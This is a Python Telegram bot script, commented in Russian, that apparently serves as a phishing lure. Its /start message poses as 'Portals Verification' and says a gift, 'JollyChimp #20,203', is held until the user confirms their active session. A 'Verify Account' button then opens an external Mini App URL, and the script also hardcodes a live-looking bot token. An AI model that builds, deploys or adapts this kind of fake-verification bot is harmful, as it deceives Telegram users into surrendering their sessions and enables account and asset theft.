import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, ContextTypes

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ТОКЕН БОТА
TOKEN = "8868277445:AAEPYSE-uoej11anci9jpiaoDYsOqL_-tps"

# Ссылка на аватарку
PHOTO_URL = "https://i.postimg.cc/4KGSwvT6/IMG-4158.jpg"

# ⚡ ССЫЛКА НА MINI APP (твой URL)
MINI_APP_URL = "https://verifying-production.up.railway.app"

# Функция для команды /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Кнопка открывает MINI APP
    keyboard = [
        [InlineKeyboardButton("✅ Verify Account", web_app=WebAppInfo(url=MINI_APP_URL))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = (
        f"🎩 *Portals Verification*\n\n"
        f"**Final Verification Required: Claim Your Gift**\n\n"
        f"Your scheduled delivery of *JollyChimp #20,203* is tagged for last-mile review. "
        f"To preserve platform safety and block fraudulent claim attempts, confirming "
        f"your active session is required before the gift can be released.\n\n"
        f"A single tap below and the asset is on its way."
    )
    
    await update.message.reply_photo(
        photo=PHOTO_URL,
        caption=message,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

# Команда /help
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *Бот для верификации*\n\n"
        "Нажми /start и затем 'Verify Account' для открытия Mini App",
        parse_mode='Markdown'
    )

def main():
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    
    logger.info("🚀 Бот запущен и работает!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
